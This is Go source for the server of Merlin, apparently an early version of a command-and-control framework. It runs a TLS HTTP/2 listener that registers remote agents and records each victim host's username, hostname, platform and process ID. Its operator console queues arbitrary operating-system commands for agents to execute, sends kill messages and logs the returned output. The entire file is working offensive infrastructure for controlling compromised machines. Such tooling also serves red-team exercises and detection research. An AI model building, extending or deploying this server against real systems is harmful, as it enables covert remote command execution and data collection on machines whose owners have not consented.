package main

import (
	//Standard
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"time"
	"flag"
	"math/rand"
	"strings"
	"path/filepath"
	"strconv"
	"log"
	"io"
	"encoding/base64"

	//3rd Party
	"github.com/fatih/color"
	"github.com/satori/go.uuid"
	"github.com/olekukonko/tablewriter"
	"github.com/chzyer/readline"

	//Merlin
	"github.com/ne0nd0g/merlin/pkg"
	"github.com/ne0nd0g/merlin/pkg/banner"
	"github.com/ne0nd0g/merlin/pkg/messages"
)

//Global Variables
var DEBUG = false
var VERBOSE = false
var src = rand.NewSource(time.Now().UnixNano())
var currentDir, _ = os.Getwd()
var agents = make(map[uuid.UUID]*agent) //global map to house agent objects

//Constants
const (
    letterIdxBits = 6                    // 6 bits to represent a letter index
    letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
    letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
    letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

func main() {

	flag.BoolVar(&VERBOSE, "v", false, "Enable verbose output")
	flag.BoolVar(&DEBUG, "debug", false, "Enable debug output")
	port := flag.Int("p", 443, "Merlin Server Port")
	ip := flag.String("i", "0.0.0.0", "The IP address of the interface to bind to")
	crt := flag.String("x509cert", filepath.Join(string(currentDir), "data/x509/server.crt"), "The x509 certificate for the HTTPS listener")
	key := flag.String("x509key", filepath.Join(string(currentDir), "data/x509/server.key"), "The x509 certificate key for the HTTPS listener")
	flag.Parse()

	color.Blue(banner.Banner1)
	color.Blue("\t\t   Version: %s", merlin.Version)

	go startListener(strconv.Itoa(*port), *ip, *crt, *key, "/")
	shell ()
}

func httpHandler(w http.ResponseWriter, r *http.Request) {
	if VERBOSE {
		color.Yellow("[-]Recieved HTTP %s Connection from %s", r.Method, r.Host)
	}

	if DEBUG {
		color.Red("\n[DEBUG]HTTP Connection Details:")
		color.Red("[DEBUG]Host: %s", r.Host)
		color.Red("[DEBUG]URI: %s", r.RequestURI)
		color.Red("[DEBUG]Method: %s", r.Method)
		color.Red("[DEBUG]Protocol: %s", r.Proto)
		color.Red("[DEBUG]Headers: %s", r.Header)
		color.Red("[DEBUG]TLS Negotiated Protocol: %s", r.TLS.NegotiatedProtocol)
		color.Red("[DEBUG]TLS Cipher Suite: %d", r.TLS.CipherSuite)
		color.Red("[DEBUG]TLS Server Name: %s", r.TLS.ServerName)
		color.Red("[DEBUG]Content Length: %d", r.ContentLength)
	}

	if r.Method == "POST" && r.ProtoMajor == 2 {

		var payload json.RawMessage
		j := messages.Base{
			Payload: &payload,
		}
		json.NewDecoder(r.Body).Decode(&j)

		if DEBUG {
			color.Red("[DEBUG]POST DATA: %s", j)
		}
		switch j.Type {

		case "InitialCheckIn":
			var p messages.SysInfo
			json.Unmarshal(payload, &p)
			agentInitialCheckIn(j, p)

		case "StatusCheckIn":
			w.Header().Set("Content-Type", "application/json")
			x := statusCheckIn(j)
			if VERBOSE {
				color.Green(x.Type)
			}
			json.NewEncoder(w).Encode(x)

		case "CmdResults":
			//TODO move to its own function
			var p messages.CmdResults
			json.Unmarshal(payload, &p)
			agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Results for job: %s\r\n",time.Now(), p.Job))

			color.Cyan("[+]Results for job %s", p.Job)
			if len(p.Stdout) > 0{
				agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Results (stdout):\r\n%s\r\n",
					time.Now(),
					p.Stdout))
				color.Green("%s", p.Stdout)
			}
			if len(p.Stderr) > 0{
				agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Results (stderr):\r\n%s\r\n",
					time.Now(),
					p.Stderr))
				color.Red("%s", p.Stderr)
			}

		default:
			color.Red("[!]Invalid Activity: %s", j.Type)
		}

	} else if r.Method == "GET" {
		//Should answer any GET requests
		//g := messages.Base{ID: uuid.NewV4(), Type: "TEST"}
		//w.Header().Set("Content-Type", "application/json")
		//json.NewEncoder(w).Encode(g)
		//Send 404
		w.WriteHeader(404)
	} else {
		w.WriteHeader(404)
	}
}

func startListener(port string, ip string, crt string, key string, webpath string) {

	time.Sleep(45 * time.Millisecond) //Sleep to allow the shell to start up
	//Check to make sure files exist
	_, err_crt := os.Stat(crt)
	if err_crt != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 certificate")
		fmt.Println(err_crt)
		return
	}

	_, err_key := os.Stat(key)
	if err_key != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 key")
		fmt.Println(err_key)
		return
	}

	cer, err := tls.LoadX509KeyPair(crt, key)

	if err != nil {
		color.Red("[!]There was an error importing the SSL/TLS x509 key pair")
		color.Red("[!]Ensure a keypair is located in the data/x509 directory")
		fmt.Println(err)
		return
	}

	//Configure TLS
	config := &tls.Config{
		Certificates: []tls.Certificate{cer},
		MinVersion: tls.VersionTLS12,
		CipherSuites: []uint16{
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
				tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,

			},
		NextProtos: []string{"h2"},
	}
	http.HandleFunc(webpath, httpHandler)

	s := &http.Server{
		Addr:           ip + ":" + port,
		Handler:        nil,
		ReadTimeout:    10 * time.Second,
		WriteTimeout:   10 * time.Second,
		MaxHeaderBytes: 1 << 20,
		TLSConfig:      config,
	}

	//I shouldn't need to specify the certs as they are in the config
	color.Yellow("[-]HTTPS Listener Started on %s:%s", ip, port)
	err2 := s.ListenAndServeTLS(crt, key)
	if err2 != nil {
		color.Red("[!]There was an error with the web server")
		fmt.Println(err2)
		return
	}
	// TODO determine scripts path and load certs by their absolute path
}

func agentInitialCheckIn(j messages.Base, p messages.SysInfo) {
	color.Green("[+]Recieved new agent checkin from %s", j.ID)
	if VERBOSE {
		color.Yellow("\t[i]Host ID: %s", j.ID)
		color.Yellow("\t[i]Activity: %s", j.Type)
		color.Yellow("\t[i]Payload: %s", j.Payload)
		color.Yellow("\t[i]Platform: %s", p.Platform)
		color.Yellow("\t[i]Architecture: %s", p.Architecture)
		color.Yellow("\t[i]Username: %s", p.UserName)
	}
	agentsDir := filepath.Join(currentDir, "data", "agents")

	if _, d_err := os.Stat(agentsDir); os.IsNotExist(d_err) {
		os.Mkdir(agentsDir, os.ModeDir)
	}
	if _, err := os.Stat(filepath.Join(agentsDir, j.ID.String())); os.IsNotExist(err) {
		os.Mkdir(filepath.Join(agentsDir, j.ID.String()), os.ModeDir)
		os.Create(filepath.Join(agentsDir, j.ID.String(),"agent_log.txt"))

		if VERBOSE{
			color.Yellow("[-]Created agent log file at: %s", agentsDir, j.ID.String(),"agent_log.txt")
		}
	}

	f, err := os.OpenFile(filepath.Join(agentsDir, j.ID.String(), "agent_log.txt"), os.O_APPEND|os.O_WRONLY, 0600)
	if err != nil {
    		panic(err)
	}
	// Add custom agent struct to global agents map
	agents[j.ID]=&agent{id: j.ID, userName: p.UserName, userGUID: p.UserGUID, platform: p.Platform,
		           architecture: p.Architecture,
		           hostName: p.HostName, pid: p.Pid, channel: make(chan []string, 10),
		           agentLog: f, iCheckIn: time.Now(), sCheckIn: time.Now()}

	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Initial check in for agent %s\r\n",time.Now(), j.ID))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Platform: %s\r\n", time.Now(), p.Platform))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Architecture: %s\r\n", time.Now(), p.Architecture))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]HostName: %s\r\n", time.Now(), p.HostName))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserName: %s\r\n", time.Now(), p.UserName))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]UserGUID: %s\r\n", time.Now(), p.UserGUID))
	agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Process ID: %d\r\n", time.Now(), p.Pid))

	//Add code here to create db record
}

func statusCheckIn(j messages.Base) messages.Base {
	if VERBOSE {
		color.Green("[+]Recieved agent status checkin from %s", j.ID)
	}
	if DEBUG{
		color.Red("[DEBUG]Recieved agent status checkin from %s", j.ID)
		color.Red("[DEBUG]Channel length: %d", len(agents[j.ID].channel))
		color.Red("[DEBUG]Channel content: %s", agents[j.ID].channel)
	}

	agents[j.ID].sCheckIn = time.Now()
	if len(agents[j.ID].channel) >= 1 {
		command := <-agents[j.ID].channel
		jobID := RandStringBytesMaskImprSrc(10)
		color.Yellow("[-]Created job %s for agent %s", jobID, j.ID)

		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command Type: %s\r\n",time.Now(), command[1]))
		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Command: %s\r\n",time.Now(), command[3:]))
		agents[j.ID].agentLog.WriteString(fmt.Sprintf("[%s]Created job %s for agent %s\r\n",time.Now(), jobID, j.ID))

		switch command[1]{
		case "cmd":
			p := messages.CmdPayload{
			Command: command[3],
			Job: jobID,
			}
			if len(command) > 4 {
				p.Args = strings.Join(command[4:], " ")
			}

			k, err := json.Marshal(p)

			if err != nil {
				color.Red("There was an error marshaling the JSON object")
				color.Red(err.Error())
			}

			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "CmdPayload",
				Payload: (*json.RawMessage)(&k),
			}

			return g

		case "control":
			p := messages.AgentControl{
			Command: command[2],
			Job: jobID,
			}

			k, _ := json.Marshal(p)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "AgentControl",
				Payload: (*json.RawMessage)(&k),
			}

			return g
		case "kill":
			p := messages.AgentControl{
			Command: command[1],
			Job: jobID,
			}

			k, _ := json.Marshal(p)
			g := messages.Base{
				Version: 1.0,
				ID:      j.ID,
				Type:    "AgentControl",
				Payload: (*json.RawMessage)(&k),
			}

			return g
		default:
			g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "ServerOk",
			}
			return g
		}
	} else {
		g := messages.Base{
			Version: 1.0,
			ID:      j.ID,
			Type:    "ServerOk",
		}
		return g
	}

}

func usage () {
	color.Yellow("Merlin C2 Server (version %s)", merlin.Version)
	table := tablewriter.NewWriter(os.Stdout)
	table.SetAlignment(tablewriter.ALIGN_LEFT)
	table.SetHeader([]string{"Command", "Arguments", "Options", "Description"})

	data := [][]string{
		[]string{"agent cmd", "<agent ID> <command>", "", "Run a command on target's operating system"},
		[]string{"agent control", "<agent ID> <command>", "kill", "Control messages & " +
			"functions to the agent itself"},
		[]string{"agent info", "<agent ID>", "", "Display all information about an agent"},
		[]string{"agent list", "None", "", "List all checked In agents"},
		[]string{"exit", "None", "", "Exit the Merlin server"},
		[]string{"quit", "None", "", "Exit the Merlin server"},
	}

	table.AppendBulk(data)
	fmt.Println()
	table.Render()
	fmt.Println()
}

func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

func getAgentList() func(string) []string {
	return func(line string) []string {
		a := make([]string, 0)
		for k := range agents {
			a = append(a, k.String())
		}
		return a
	}
}

func shell() {

	var agentCompleter = readline.PcItemDynamic(getAgentList())
	var completer = readline.NewPrefixCompleter(
		readline.PcItem("agent",
			readline.PcItem("list"),
			readline.PcItem("info",
				agentCompleter,
			),
			readline.PcItem("cmd",
				agentCompleter,
			),
			readline.PcItem("control",
				agentCompleter,
			),
			readline.PcItem("kill",
				agentCompleter,
			),
		),
		readline.PcItem("exit"),
		readline.PcItem("quit"),
		readline.PcItem("help"),
	)

	ms, err := readline.NewEx(&readline.Config{
		Prompt:          "\033[31mMerlin»\033[0m ",
		HistoryFile:     "/tmp/readline.tmp",
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
		HistorySearchFold:   true,
		FuncFilterInputRune: filterInput,
	})

	if err != nil {
		panic(err)
	}
	defer ms.Close()

	log.SetOutput(ms.Stderr())

	for {
		line, err := ms.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		cmd := strings.Split(line, " ")

		switch cmd[0]{
		case "agent":
			switch cmd[1] {
			case "list":
				table := tablewriter.NewWriter(os.Stdout)
				table.SetHeader([]string{"Agent GUID", "Platform", "User", "Host", "Transport"})
				table.SetAlignment(tablewriter.ALIGN_CENTER)
				for k, v := range agents {
    					table.Append([]string{k.String(), v.platform + "/" + v.architecture, v.userName,
								v.hostName, "HTTP/2"})
				}
				fmt.Println()
				table.Render()
				fmt.Println()
			case "info":
				if len(cmd) == 2 {
				color.Red("[!]Invalid command")
				color.White("agent info <agent_id>")
				} else if len(cmd) >= 3 {
					a, _ := uuid.FromString(cmd[2])
					table := tablewriter.NewWriter(os.Stdout)
					table.SetAlignment(tablewriter.ALIGN_LEFT)
					data := [][]string{
						[]string{"ID", agents[a].id.String()},
						[]string{"Platform", agents[a].platform},
						[]string{"Architecture", agents[a].architecture},
						[]string{"UserName", agents[a].userName},
						[]string{"User GUID", agents[a].userGUID},
						[]string{"Hostname", agents[a].hostName},
						[]string{"Process ID", strconv.Itoa(agents[a].pid)},
						[]string{"Inital Check In", agents[a].iCheckIn.String()},
						[]string{"Last Check In", agents[a].sCheckIn.String()},
					}
					table.AppendBulk(data)
					fmt.Println()
					table.Render()
					fmt.Println()
				}
			case "cmd":
				if len(cmd) >= 4 {
					a, _ := uuid.FromString(cmd[2])
					s := agents[a].channel //https://github.com/golang/go/issues/3117
					s <- cmd
					a_cmd := base64.StdEncoding.EncodeToString([]byte(cmd[3]))
					if DEBUG {
						color.Red("[DEBUG]Input: %s", cmd[3])
						color.Red("[DEBUG]Base64 Input: %s", a_cmd)
					}
				}else {
					color.Red("[!]Invalid command")
					color.White("agent cmd <agent ID> <cmd>")
				}
			case "kill":
				if len(cmd) == 3 {
					a, _ := uuid.FromString(cmd[2])
					s := agents[a].channel //https://github.com/golang/go/issues/3117
					s <- cmd
				}else {
					color.Red("[!]Invalid command")
					color.White("agent kill <agent ID>")
				}
			case "control":
				color.Red("[!]Agent control not implemented yet")
			default:
				println("invalid agent command:", line[5:])
			}
		case "help":
			usage()
		case "?":
			usage()
		case "exit":
			color.Red("[!]Quitting")
			os.Exit(0)
		case "quit":
			color.Red("[!]Quitting")
			os.Exit(0)
		case "":
		default:
			log.Println("you said:", strconv.Quote(line))
		}
	}
}

func RandStringBytesMaskImprSrc(n int) string {
	//http://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-golang
    b := make([]byte, n)
    // A src.Int63() generates 63 random bits, enough for letterIdxMax characters!
    for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
        if remain == 0 {
            cache, remain = src.Int63(), letterIdxMax
        }
        if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
            b[i] = letterBytes[idx]
            i--
        }
        cache >>= letterIdxBits
        remain--
    }

    return string(b)
}

type agent struct {
	id		uuid.UUID
	platform	string
	architecture	string
	userName	string
	userGUID	string
	hostName 	string
	pid 		int
	agentLog	*os.File
	channel		chan []string
	iCheckIn	time.Time
	sCheckIn	time.Time
}